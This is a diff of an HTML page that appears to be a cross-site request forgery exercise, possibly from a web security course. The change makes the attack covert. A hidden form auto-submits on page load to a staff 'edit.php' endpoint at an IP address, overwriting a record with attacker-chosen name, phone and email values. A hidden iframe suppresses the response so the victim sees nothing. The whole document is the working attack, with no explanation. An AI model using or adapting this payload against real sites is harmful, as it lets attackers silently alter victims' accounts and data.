@@ -8,20 +8,19 @@
     <title>Document</title>
 </head>
 
-<!-- <body onload="document.csrfForm.submit()"> -->
-<body>
-   <h1>hello</h1>
-    <form name="csrfForm" action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=1" method="POST>
-        <input type="text" name="first_name" value="Alice">
-        <input type="text" name="last_name" value="Hacker">
-        <input type="text" name="phone" value="secret">
-        <input type="text" name="email" value="hacker@gmail.com">
-        <input type="submit" value="See your job functions">
+<html>
+  <head>
+    <title>NOT A FAKE FORM</title>
+  </head>
+  <body onload="document.my_form.submit()">
+    <form action="https://35.184.199.7/red/public/staff/salespeople/edit.php?id=1" method="POST" name="my_form" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="Alice" />
+      <input type="text" name="last_name" value="Hacker" />
+      <input type="text" name="phone" value="secret" />
+      <input type="text" name="email" value="hacker@gmail.com" />
     </form>
     <iframe name="hidden_results" style="display: none;"></iframe>
-    <script>
-        document.csrfForm.submit();
-    </script>
-</body>
+  </body>
+</html>
 
 </html>
